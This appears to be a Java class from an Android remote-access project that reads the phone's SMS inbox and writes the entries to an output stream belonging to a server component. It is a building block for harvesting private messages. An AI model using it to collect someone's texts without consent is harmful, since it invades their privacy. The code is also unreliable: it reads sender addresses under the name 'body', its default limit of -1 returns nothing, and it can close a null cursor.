package org.blacklight.ohhai.reader;

import java.io.PrintWriter;
import java.util.ArrayList;

import org.blacklight.ohhai.server.OhHaiProgram;

import android.content.ContentResolver;
import android.database.Cursor;
import android.net.Uri;

public class SmsReader {
	private ContentResolver res;
	private PrintWriter out;
	private int limitMessage;
	
	public SmsReader (ContentResolver res, PrintWriter out, int limitMessage)
	{
		this.res = res;
		this.out = out;
		this.limitMessage = limitMessage;
	}
	
	public SmsReader (ContentResolver res, PrintWriter out)
	{
		this (res, out, -1);
	}
	
	public ArrayList<String> getSms() {
		ArrayList<String> messages = new ArrayList<String>();
		Cursor cursor = null;
	        
		try
		{
			cursor = res.query (Uri.parse("content://sms/inbox"), null, null, null, null);
			
			if (cursor == null) {
				OhHaiProgram.addMessage("The SMS cursor is null", out, null);
				return messages;
			}
			
			OhHaiProgram.addMessage("Found " + cursor.getCount() + " messages\n", out, null);
			
			if (cursor.moveToFirst())
			{
				OhHaiProgram.addMessage("HERE\n", out, null);
				
				for (int i=0; i < limitMessage; i++)
				{
					String body = cursor.getString(cursor.getColumnIndexOrThrow("address")).toString();
					OhHaiProgram.addMessage(body + "\n", out, null);
					messages.add(body);
					
					if (!cursor.moveToNext())
						break;
				}
			}
		} catch (Exception e) {
			OhHaiProgram.addMessage("Error while reading the sms list", out, e);
		} finally {
			cursor.close();
		}
		
		return messages;
	}
}
